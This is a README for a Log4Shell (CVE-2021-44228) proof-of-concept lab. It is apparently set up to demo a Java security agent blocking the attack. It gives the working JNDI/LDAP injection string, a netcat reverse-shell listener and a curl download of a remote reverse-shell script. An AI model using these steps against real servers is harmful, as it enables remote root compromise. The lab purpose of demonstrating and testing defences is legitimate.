# log4j-shell-poc
A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
Kudos to kozmer for the POC. I just added some niceties for demoing purposes and added the Waratek agent.<br><br>

Setup
----------------------------------------

This works best with two machines. I prefer to spin up 2 droplets on Digital Ocean because it's cheap for test purposes.<br><br>
One machine acts as the target while the other acts as the attacker.<br><br>
Before moving forward, download the following version of Java SE Development Kit `java-8u20` here: https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html<br><br>

Prep
----------------------------------------

- Move the extracted archive for the Java SE Development Kit into the root of this repo
- Upload the root of this repo with the extracted Java SE Development Kit into your **attacker** machine
- Ensure that `python3` is installed on your attacker machine (if not follow guide here: https://www.digitalocean.com/community/tutorials/how-to-install-python-3-and-set-up-a-programming-environment-on-an-ubuntu-20-04-server)
- Upload the root of this repo without the extracted Java SE Development Kit into your **target** machine

Steps to Follow
----------------------------------------

#### Start the vulnerable application on the target machine with the following commands

```bash
$ docker build -t log4j-shell-poc .
$ docker run --network host log4j-shell-poc
```

Note: This runs the application without the Waratek Security-as-Code platform. More information on implementing the platform below.<br><br>

### Prep the exploit

- On the attacker machine open 2 shells: One to listen for the reverse shell, and one to run the server
- On the first shell for the attacker machine, open a port with netcat: `$ nc -lvnp 9001`
- On the second shell for the attacker machine, start the webserver that will deliver the exploit payload with: `$ python3 poc.py --userip {attackerIP} --webport 8080 --lport 9001` where `{attackerIP}` is the IP address of the attacker machine
- When the web server launches, you'll receive a payload in the ouput as seen below:
```py
$ python3 poc.py --userip {attackerIP} --webport 8080 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```
- Copy the payload from __"Send me:"__ and open up the vulnerable application in your browser.
- Paste the payload into the email field and put in any value as the password, then press "Sign in."
- The browser should hang and then on the attacker machine shell with netcat running you should see a connection established.
- Download this reverse shell Python script with: `$ curl -O https://gist.githubusercontent.com/jacobwarren/0abf1c5d3d2e969ac8dfcc5a10abf8e8/raw/7dce0c1924c06c20c1471bc4c0824704024c535c/revsh.py`
- Then run it with `$ python3 revsh.py` to establish a TTY
- Now run `$ WHOAMI` to verify that you're indeed root.

Testing the Security-as-Code agent
----------------------------------------

- Move the `waratek` folder to the root directory of this repo
- In the `Dockerfile` uncomment out lines 30, 33, and 36.

#### Line 30
This line adds the waratek folder to the Tomcat directory in the container<br><br>

#### Line 33
This line sets proper permissions for the contents of the agent folder<br><br>

#### Line 36
This line sets the Java options to start launch your application with Waratek as your Java agent<br><br>

### Configure your agent
Within the `waratek/conf_1` directory, open the `waratek.properties` file.<br><br>

- Assign the desired agent ID to your application with the `com.waratek.ControllerKey` property
- Assign your organization ID with the `com.waratek.OrgId` property
- To authenticate your application, assign both your `accessKey` and `secretKey` to the assocated properties

### Rebuild Docker container
```bash
$ docker build -t log4j-shell-poc .
$ docker run --network host log4j-shell-poc
```

- Go through the above steps again to reproduce the POC
- Verify the exploit works
- Define your security behavior either in the Policy Config file (running in the container - so `docker exec` in) or from within the Portal
- Verify that the exploit isn't possible to perform again without restarting the container
